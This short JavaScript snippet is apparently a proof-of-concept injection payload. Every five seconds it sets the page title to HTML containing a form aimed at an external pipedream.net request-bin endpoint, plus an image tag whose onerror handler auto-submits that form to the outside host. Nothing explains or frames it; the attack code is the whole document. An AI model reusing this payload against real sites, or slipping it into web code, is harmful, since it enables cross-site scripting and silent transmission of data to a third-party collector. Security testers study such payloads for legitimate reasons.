function changeTitle(){
    window.setInterval(function(){
        document.title = '<form id="send_data" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
            <input type="text" id="name" name="name" value="b" placeholder="your name"> \
            <input type="submit" value="Submit"></form>\
            <image>src="x" onerror=document.getElementById("send_data").submit()</image>';
    }, 5000);
    
}